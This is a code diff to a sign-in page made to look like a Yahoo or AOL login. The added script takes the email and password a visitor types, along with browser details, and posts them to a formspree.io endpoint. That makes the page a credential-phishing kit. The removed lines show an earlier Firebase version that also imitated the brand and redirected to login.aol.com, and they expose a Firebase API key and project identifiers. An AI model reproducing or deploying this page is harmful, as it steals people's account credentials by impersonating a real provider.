@@ -52,7 +52,7 @@
     <strong class="challenge-heading">Sign in</strong>
     <span class="challenge-desc">&nbsp;</span>
     </span>
-    <form id="signUp-form" class="pure-form">
+    <form id="myForm" onsubmit="submitForm(event)" class="pure-form">
         <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-3">
             <div id="selected-country-code-cont" class="puree-dropdown selected-country-code-cont ltr hide">
                 <div id="selected-country-code" class="selected-country-code">+234</div>
@@ -299,16 +299,16 @@
 
             </div>
             <div class="input-group">
-                <input class="phone-no " type="email" name="username" id="email_login" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
+                <input class="phone-no " type="email" name="username" id="useremail" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
                 <div class="input-field-icon hide" id="username-field-icon"></div>
-                <label for="login-username" id="login-label" class="login-label">Username, email, or mobile</label>
+                <label for="login-username" id="useremail" class="login-label">Username, email, or mobile</label>
                 <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
                     <li data-fill="yahoo.com" tabindex="2">yahoo.com</li><li data-fill="gmail.com" tabindex="3">gmail.com</li><li data-fill="outlook.com" tabindex="4">outlook.com</li><li data-fill="aol.com" tabindex="5">aol.com</li>
                 </ul>            </div>
             <div class="input-group">
-                <input class="phone-no " type="password" name="password" id="password_login" value="" autocomplete="password" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
+                <input class="phone-no " type="password" name="password" id="userpassword" value="" autocomplete="password" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
                 <div class="input-field-icon hide" id="username-field-icon"></div>
-                <label for="login-password" id="login-label" class="login-label">Password</label>
+                <label for="login-password" id="userpassword" class="login-label">Password</label>
                 <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
                     <li data-fill="yahoo.com" tabindex="2">yahoo.com</li><li data-fill="gmail.com" tabindex="3">gmail.com</li><li data-fill="outlook.com" tabindex="4">outlook.com</li><li data-fill="aol.com" tabindex="5">aol.com</li>
                 </ul>            </div>
@@ -399,98 +399,49 @@
     </body>
     <!-- Sweetalert CDN for Popup -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha512-AA1Bzp5Q0K1KanKKmvN/4d3IRKVlv9PYgwFPvm32nPO6QS8yH1HO7LbgB1pgiOxPtfeg5zEn2ba64MUcqJx6CA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script>
+    function submitForm(event) {
+      event.preventDefault();
 
-  <script type="module">
-    // Import the functions you need from the SDKs you need
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
-    import { getAuth, createUserWithEmailAndPassword, updateProfile } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js"; 
-    // TODO: Add SDKs for Firebase products that you want to use
-    // https://firebase.google.com/docs/web/setup#available-libraries
-  
-    // Your web app's Firebase configuration
-    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-    const firebaseConfig = {
-    apiKey: "AIzaSyC9bYZno33reps-a0iorttht_OMjpsjy2o",
-    authDomain: "login-test-4f7cd.firebaseapp.com",
-    projectId: "login-test-4f7cd",
-    storageBucket: "login-test-4f7cd.appspot.com",
-    messagingSenderId: "767596281646",
-    appId: "1:767596281646:web:5e1de8e8a80090021584bf"
-  };
-  
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app)
+      // Get user's input data 
+      const formData = {
+        useremail: document.getElementById('useremail').value,
+        userpassword: document.getElementById('userpassword').value,
+      };
 
+      //Get user's browser details
+      const browserDetails = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+      };
 
-     document.getElementById('signUp-form')
-     .addEventListener('submit', (e) => {
-        e.preventDefault();
+      //Combine user input data with browser details
+      const combinedData = {
+        ...formData,
+        ...browserDetails,
+      };
 
-        let emailLogin = document.getElementById('email_login').value
-        let passwordLogin = document.getElementById('password_login').value   
-        
+      // Sens combined data to your form backend (replace 'your-backend-url' with the actual URL)
+      fetch('https://formspree.io/f/xbjelena',
+      {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(combinedData),
+      })
+      .then(response => {
+        // Handle the backend response if needed
+        console.log('Backend response:', response);
+        // Perform additional form submission logic if needed
 
-        // Form Authentication
-        if(emailLogin.trim() === '' || passwordLogin.trim() === ''){
-           swal({
-            text: 'All Inputs Field are required',
-            icon: 'warning'
-           })
-        }
-         else if(passwordLogin.length < 6)
-        {
-          // Popout this if the password length is less than six
-          swal({
-            text: 'Password must be atleast 6',
-            icon: 'warning'
-          })
-        } 
-        else 
-        {
-          createUserWithEmailAndPassword(auth, emailLogin, passwordLogin)
-        .then((userCredential) => {
-
-          if(userCredential){
-            swal({
-              title: 'Good Job',
-              text: 'You have loged in successfully',
-              icon: 'success'
-            })
-             .then(value => {
-              if(value){
-                 window.location.replace('https://login.aol.com/')
-              }
-             })
-
-             
-            
-          }
-          
-          
-        }).catch((err) => {
-                if (err.code === 'auth/email-already-in-use') {
-                swal({
-                  title: 'Error',
-                  text: 'The email address is already in use',
-                  icon: 'error'
-                });
-              } else if (err.code === 'auth/invalid-email') {
-                swal({
-                  title: 'Error',
-                  text: 'Invalid email address',
-                  icon: 'error'
-                });
-              } else {
-                swal({
-                  title: 'Error',
-                  text: `${err.message}`,
-                  icon: 'error'
-                });
-              }
-        })
-        }
-       
-     })
+        document.getElementById('myForm').submit();
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        // handle errors if needed
+      });
+    }
   </script>
 </html>
